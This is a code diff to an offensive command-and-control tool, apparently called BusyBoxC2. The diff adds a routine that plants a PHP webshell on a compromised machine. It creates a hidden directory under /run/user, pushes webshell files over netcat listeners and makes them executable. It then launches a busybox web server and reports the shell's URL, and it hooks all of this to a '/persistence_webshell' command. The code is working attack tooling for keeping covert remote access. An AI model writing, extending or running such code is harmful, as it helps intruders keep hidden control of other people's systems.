@@ -130,6 +130,41 @@ class BusyBoxC2:
 
         return listening_port, t
     
+    def _install_webshell(self):
+
+        ### ToDo : Upload a tar archive and extract it to preserve execution rights on files.
+
+
+        # Webshell destination path
+        webshell_destination_path = "/run/user/$(id -u)/.http/"
+
+        # Create web directory on remote
+        cmd = "mkdir -p " + webshell_destination_path
+        self._send_cmd(cmd)
+
+        # Upload all ressources on remote
+        webshell_ressources_path = "./ressources/webshell/"
+        webshell_files = ["httpd.conf", "index.php", "php-cgi", "php-wrapper"]
+        for file in webshell_files:
+            listening_port = random.randint(1024, 65534)
+            remote_cmd = "nc -lp " + str(listening_port) + " > " + webshell_destination_path + file
+            #print("Remote cmd: " + remote_cmd)
+            t = threading.Thread(target=self._send_cmd, args=(remote_cmd,))
+            t.start()
+            local_cmd = "sleep 0.2; busybox nc " + self.server_ip + " " + str(listening_port) + " < " + webshell_ressources_path + file
+            #print("Local cmd: " + local_cmd)
+            os.system(local_cmd)
+
+        # Chmod necessary files (to remove)
+        cmd = "chmod +x " + webshell_destination_path + "php-*"
+        self._send_cmd(cmd)
+    
+        # Run webserver
+        webserver_port = random.randint(1024, 65534)
+        cmd = "httpd -p " + str(webserver_port) + " -c " + webshell_destination_path + "httpd.conf -h " + webshell_destination_path
+        self._send_cmd(cmd)
+        print(f"[*]Your webshell is ready on http://{self.server_ip}:{webserver_port}/index.php")
+
     def run(self):
         try:
             while True:
@@ -157,6 +192,7 @@ class BusyBoxC2:
                             self._download()
                         case '/persistence_webshell':
                             # launch web server and drop pwnyshell
+                            self._install_webshell()
                             pass
                         case _:
                             self._send_cmd(cmd)
